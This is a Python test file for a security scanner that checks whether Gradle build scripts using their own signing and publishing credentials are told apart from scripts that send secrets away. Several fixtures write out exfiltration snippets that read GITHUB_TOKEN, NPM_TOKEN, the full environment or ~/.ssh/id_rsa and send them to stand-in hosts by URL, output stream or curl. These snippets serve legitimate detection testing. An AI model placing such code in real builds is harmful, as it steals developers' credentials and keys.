"""A Gradle build's own credentials, as against credentials a build script sends away (FP-14).

The benign lines are taken from real Android and JVM build scripts in the long-tail corpus that
`MALWARE.EXFIL.001` blocked. The exfiltration lines are the same reads with the value sent on.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from cordon_scanner import Scanner
from cordon_scanner.detect.infra.gradle_auth import GradleBuildAuth
from cordon_scanner.foundation.config import Config

SIGNING_BUILD = """plugins { id("com.android.application") }

val debugKeystorePassword = System.getenv("APP_DEBUG_KEYSTORE_PASSWORD")?.takeIf { it.isNotBlank() } ?: "android"
val lastFmKey = localProperties.getProperty("LASTFM_API_KEY") ?: System.getenv("LASTFM_API_KEY") ?: ""

android {
    defaultConfig {
        buildConfigField("String", "LASTFM_API_KEY", "\\"$lastFmKey\\"")
    }
    signingConfigs {
        create("release") {
            storePassword = System.getenv("STORE_PASSWORD")
            keyAlias = System.getenv("KEY_ALIAS")
            keyPassword = System.getenv("KEY_PASSWORD")
        }
        getByName("debug") { storePassword = debugKeystorePassword }
    }
}

intellijPlatform { publishing { token.set(System.getenv("PLUGIN_PUBLISH_TOKEN")) } }

fun protocUrl(version: String): String =
    "https://repo1.maven.org/maven2/com/google/protobuf/protoc/$version/protoc-$version.exe"

val definitions = java.net.URL("https://www.jetbrains.com/updates/updates.xml").readText()
"""


class GradleKit:
    @staticmethod
    def rules(tmp_path: Path, build: str) -> set[str]:
        (tmp_path / "settings.gradle.kts").write_text(
            'rootProject.name = "app"\n', encoding="utf-8"
        )
        (tmp_path / "build.gradle.kts").write_text(build, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return {f.rule_id for f in result.findings}


class TestTheBuildsOwnCredentials:
    @pytest.mark.parametrize(
        "line",
        [
            '            storePassword = System.getenv("STORE_PASSWORD")',
            'intellijPlatform { publishing { token.set(System.getenv("PLUGIN_PUBLISH_TOKEN")) } }',
        ],
    )
    def test_read_straight_into_a_sink(self, line: str) -> None:
        assert GradleBuildAuth._own([line], 1)

    def test_a_name_used_only_in_sinks(self) -> None:
        lines = SIGNING_BUILD.splitlines()
        number = next(i for i, text in enumerate(lines, 1) if text.startswith("val lastFmKey"))
        assert GradleBuildAuth._own(lines, number)


class TestACredentialThatLeaves:
    @pytest.mark.parametrize(
        "build",
        [
            'val key = System.getenv("API_KEY")\nval r = java.net.URL("https://collect.example.invalid/?k=$key").readText()\n',
            'val token = System.getenv("NPM_TOKEN")\ntasks.register<Exec>("x") { commandLine("curl", "-d", token, "https://x.invalid") }\n',
            'val token = System.getenv("NPM_TOKEN")\nval copy = token\nprintln(copy)\n',
            'val home = System.getProperty("user.home")\nval key = file("$home/.ssh/id_rsa").readText()\n',
        ],
    )
    def test_is_not_excused(self, build: str) -> None:
        lines = build.splitlines()
        assert not GradleBuildAuth._own(lines, 1)

    def test_a_declaration_is_never_a_sink_by_its_name(self) -> None:
        lines = ['val key = System.getenv("K")', 'val u = URL("https://x.invalid/$key")']
        assert not GradleBuildAuth._own(lines, 1)


class TestABuildScript:
    def test_that_signs_and_downloads_is_not_exfiltration(self, tmp_path: Path) -> None:
        assert "MALWARE.EXFIL.001" not in GradleKit.rules(tmp_path, SIGNING_BUILD)

    @pytest.mark.parametrize(
        ("name", "build"),
        [
            (
                "build.gradle.kts",
                'val token = System.getenv("GITHUB_TOKEN")\n'
                'val c = java.net.URL("https://collect.example.invalid/").openConnection()\n'
                "c.doOutput = true\n"
                "c.getOutputStream().write(token.toByteArray())\n",
            ),
            (
                "build.gradle",
                'def token = System.getenv("NPM_TOKEN")\n'
                'new URL("https://collect.example.invalid/?t=${token}").text\n',
            ),
            # Kotlin has no `new`; both were missed before review 98.
            (
                "build.gradle.kts",
                "val env = System.getenv()\n"
                'val c = java.net.URL("https://collect.example.invalid/?e=$env").readText()\n',
            ),
            (
                "build.gradle.kts",
                'val key = file(System.getProperty("user.home") + "/.ssh/id_rsa").readText()\n'
                'java.net.URL("https://collect.example.invalid/?k=$key").readText()\n',
            ),
        ],
    )
    def test_that_sends_a_token_away_still_blocks(
        self, tmp_path: Path, name: str, build: str
    ) -> None:
        (tmp_path / "settings.gradle.kts").write_text(
            'rootProject.name = "app"\n', encoding="utf-8"
        )
        (tmp_path / name).write_text(build, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        assert "MALWARE.EXFIL.001" in {f.rule_id for f in result.findings}
